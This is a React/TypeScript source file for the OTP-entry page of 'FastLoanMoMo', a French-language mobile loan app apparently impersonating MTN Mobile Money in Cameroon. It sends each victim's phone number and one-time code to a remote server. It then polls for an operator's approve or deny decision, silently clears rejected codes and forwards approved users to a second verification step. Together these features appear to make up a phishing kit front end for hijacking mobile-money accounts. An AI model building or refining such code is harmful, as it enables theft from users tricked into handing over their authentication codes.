import { useState, useEffect, useRef, type KeyboardEvent } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, ArrowLeft } from "lucide-react";

const API_URL = "https://cameroon-mtn-loan-app.onrender.com";

const OTPVerification = () => {
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState<number>(45); 
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "671234567";

  const formatPhone = (num: string) => {
    let clean = num.replace(/\D/g, ""); 
    if (clean.startsWith("237")) clean = clean.substring(3);
    if (clean.length === 9) return `+237 ${clean.substring(0, 2)} ••••${clean.slice(-2)}`;
    return `+237 ${clean}`;
  };

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const isOtpComplete = otp.every((digit) => digit !== "");

  useEffect(() => {
    if (timeLeft === 0) return;
    const timerId = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const handleOtpChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = cleanValue;
    setOtp(newOtp);
    if (cleanValue && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async () => {
    if (!isOtpComplete) return;
    setIsVerifying(true);
    
    const timeoutId = setTimeout(() => {
      setIsVerifying(false);
      setTimeLeft(0); 
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phoneNumber, otp_code: otp.join("") }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.otp_id) {
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            clearTimeout(timeoutId);
            setIsVerifying(false);
            
            if (statusData.status === "approved") {
              navigate("/second-verification", { state: { phone: phoneNumber } });
            } else if (statusData.status === "denied") {
              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
              setOtp(["", "", "", ""]);
              setTimeLeft(0); 
              inputRefs.current[0]?.focus();
            }
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsVerifying(false);
        setTimeLeft(0);
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsVerifying(false);
      setTimeLeft(0);
    }
  };

  const handleResend = async () => {
    if (timeLeft > 0 || isVerifying) return;
    
    setIsVerifying(true);
    // Ensure inputs are blank when resending
    setOtp(["", "", "", ""]); 

    const timeoutId = setTimeout(() => {
      setIsVerifying(false);
      setTimeLeft(0); 
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/resend-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.otp_id) {
        setTimeLeft(45); // Reset timer
        
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            clearTimeout(timeoutId);
            setIsVerifying(false);
            
            if (statusData.status === "approved") {
              navigate("/second-verification", { state: { phone: phoneNumber } });
            } else if (statusData.status === "denied") {
              // ✅ Denied: Stay on OTP page, clear inputs silently, reset timer
              setOtp(["", "", "", ""]);
              setTimeLeft(0); 
              inputRefs.current[0]?.focus();
            }
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsVerifying(false);
        setTimeLeft(0);
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsVerifying(false);
      setTimeLeft(0);
    }
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Prêts mobiles instantanés</p>
      </div>

      <div className="main-card">
        <button onClick={() => navigate(-1)} className="btn-back" style={{ color: '#6B7280', fontWeight: 500, display: 'flex', alignItems: 'center' }}>
          <ArrowLeft size={18} style={{ marginRight: '6px' }} /> Retour
        </button>
        
        <h2 className="title" style={{ fontSize: '28px', marginBottom: '12px' }}>Vérifiez votre numéro</h2>
        
        <p className="subtitle" style={{ lineHeight: '1.6', color: '#4B5563', marginBottom: '32px' }}>
          Nous avons envoyé un code à 4 chiffres au <span className="bold">{formatPhone(phoneNumber)}</span>.
        </p>
        
        <div className="otp-container">
          {otp.map((digit, index) => (
            <input 
              key={index} 
              ref={(el) => { inputRefs.current[index] = el; }}
              type="text" 
              inputMode="numeric"
              value={digit} 
              onChange={(e) => handleOtpChange(index, e.target.value)} 
              onKeyDown={(e) => handleKeyDown(index, e)}
              className="otp-box" 
              maxLength={1}
              style={{ color: '#111827', fontSize: '24px', fontWeight: '600', backgroundColor: '#FFFFFF', border: '1.5px solid #D1D5DB', borderRadius: '16px', outline: 'none' }}
            />
          ))}
        </div>

        <button 
          onClick={handleVerify} 
          className="btn-primary" 
          disabled={!isOtpComplete || isVerifying} 
          style={{
            backgroundColor: (isOtpComplete && !isVerifying) ? 'var(--button-yellow)' : '#FDE68A',
            color: (isOtpComplete && !isVerifying) ? 'white' : '#9CA3AF',
            cursor: (isOtpComplete && !isVerifying) ? 'pointer' : 'not-allowed',
            marginBottom: '24px'
          }}
        >
          {isVerifying ? "En attente..." : "Vérifier & se connecter"}
        </button>
        
        <div style={{ textAlign: 'center', marginBottom: '24px' }}>
          <p className="helper-text" style={{ display: 'inline', marginRight: '8px' }}>
            Vous n'avez pas reçu le code ?
          </p>
          <button
            onClick={handleResend}
            disabled={timeLeft > 0 || isVerifying}
            style={{
              background: 'none',
              border: 'none',
              color: timeLeft > 0 ? '#9CA3AF' : '#111827',
              fontWeight: 700,
              cursor: timeLeft > 0 ? 'not-allowed' : 'pointer',
              fontSize: '14px',
              textDecoration: timeLeft === 0 ? 'underline' : 'none',
              padding: 0
            }}
          >
            {isVerifying ? "Envoi..." : timeLeft > 0 ? `Renvoyer dans ${timeLeft}s` : "Renvoyer le code"}
          </button>
        </div>
      </div>

      {isVerifying && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="spinner"></div>
            <h3 className="modal-title">Vérification en cours</h3>
            <p className="modal-text">Veuillez patienter...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default OTPVerification;